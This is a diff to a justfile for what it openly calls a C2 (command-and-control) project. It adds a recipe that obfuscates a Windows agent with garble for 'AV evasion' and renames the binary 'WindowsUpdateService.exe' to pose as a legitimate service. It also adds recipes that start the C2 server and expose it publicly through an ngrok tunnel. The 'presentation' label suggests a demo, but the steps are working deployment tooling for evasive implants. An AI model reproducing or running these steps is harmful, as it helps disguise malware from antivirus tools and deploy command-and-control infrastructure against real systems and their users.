@@ -74,6 +74,37 @@ build-release os arch:
     fi
     @echo "✓ Release build complete (optimized)"
 
+# Build obfuscated agent for Windows (AV evasion)
+build-obfuscated:
+    @echo "=========================================="
+    @echo "   Building Obfuscated Agent"
+    @echo "=========================================="
+    @echo ""
+    @echo "[1/2] Compiling with garble obfuscation..."
+    @mkdir -p {{BUILD_DIR}}/windows
+    @GOOS=windows GOARCH=amd64 garble -tiny -literals -seed=random build -o {{BUILD_DIR}}/windows/agent_obfuscated.exe ./cmd/agent 2>&1 | grep -v "chosen at random" || true
+    @echo "      [+] Agent obfuscated"
+    @echo ""
+    @echo "[2/2] Renaming to legitimate Windows service name..."
+    @cp {{BUILD_DIR}}/windows/agent_obfuscated.exe {{BUILD_DIR}}/windows/WindowsUpdateService.exe
+    @echo "      [+] Renamed to WindowsUpdateService.exe"
+    @echo ""
+    @echo "=========================================="
+    @echo "   Build Complete!"
+    @echo "=========================================="
+    @echo ""
+    @echo "Files:"
+    @ls -lh {{BUILD_DIR}}/windows/WindowsUpdateService.exe
+    @echo ""
+    @echo "Features:"
+    @echo "  [+] Code obfuscated with garble"
+    @echo "  [+] Strings obfuscated"
+    @echo "  [+] Control flow obfuscated"
+    @echo "  [+] Legitimate service name"
+    @echo ""
+    @echo "Deploy: build/windows/WindowsUpdateService.exe"
+    @echo ""
+
 # Clean build artifacts
 clean:
     @echo "Cleaning build artifacts..."
@@ -175,6 +206,66 @@ dev-server port="8080":
     @echo "Starting server on port {{port}}..."
     @echo "Press Ctrl+C to stop"
     @go run {{SERVER_MAIN}}
+
+# Start server + ngrok for presentation
+start:
+    @echo "=========================================="
+    @echo "   Starting C2 Server + Ngrok"
+    @echo "=========================================="
+    @echo ""
+    @echo "[1/3] Stopping existing processes..."
+    @pkill -f "server/main.go" 2>/dev/null || true
+    @lsof -ti :8080 | xargs kill -9 2>/dev/null || true
+    @pkill ngrok 2>/dev/null || true
+    @sleep 2
+    @echo "      [+] Cleanup complete"
+    @echo ""
+    @echo "[2/3] Starting C2 server..."
+    @bash -c 'export $(cat .env | grep -v "^#" | xargs) && nohup go run cmd/server/main.go > server.log 2>&1 &'
+    @sleep 4
+    @echo "      [+] Server running on 0.0.0.0:8080"
+    @echo ""
+    @echo "[3/3] Starting ngrok tunnel..."
+    @nohup ngrok http 8080 > ngrok.log 2>&1 &
+    @sleep 5
+    @echo "      [+] Ngrok tunnel active"
+    @echo ""
+    @echo "=========================================="
+    @echo "   Server Ready!"
+    @echo "=========================================="
+    @echo ""
+    @echo "Dashboard: http://localhost:8080"
+    @curl -s http://localhost:4040/api/tunnels | python3 -c "import sys, json; data = json.load(sys.stdin); print('Public URL:', data['tunnels'][0]['public_url'] if data.get('tunnels') else 'ERROR: Ngrok not ready')" || echo "Public URL: Starting..."
+    @echo ""
+    @echo "Logs:"
+    @echo "  Server: tail -f server.log"
+    @echo "  Ngrok:  tail -f ngrok.log"
+    @echo ""
+
+# Stop server + ngrok
+stop:
+    @echo "=========================================="
+    @echo "   Stopping C2 Server + Ngrok"
+    @echo "=========================================="
+    @echo ""
+    @echo "[1/3] Stopping server..."
+    @pkill -f "server/main.go" 2>/dev/null && echo "      [+] Server stopped" || echo "      [-] Server not running"
+    @echo ""
+    @echo "[2/3] Stopping ngrok..."
+    @pkill ngrok 2>/dev/null && echo "      [+] Ngrok stopped" || echo "      [-] Ngrok not running"
+    @echo ""
+    @echo "[3/3] Releasing port 8080..."
+    @lsof -ti :8080 | xargs kill -9 2>/dev/null && echo "      [+] Port 8080 released" || echo "      [+] Port 8080 already free"
+    @echo ""
+    @echo "=========================================="
+    @echo "   Stopped!"
+    @echo "=========================================="
+
+# Restart server + ngrok
+restart:
+    @just stop
+    @sleep 2
+    @just start
 
 # Run agent in development mode with custom jitter
 dev-agent jitter-min="1" jitter-max="2":
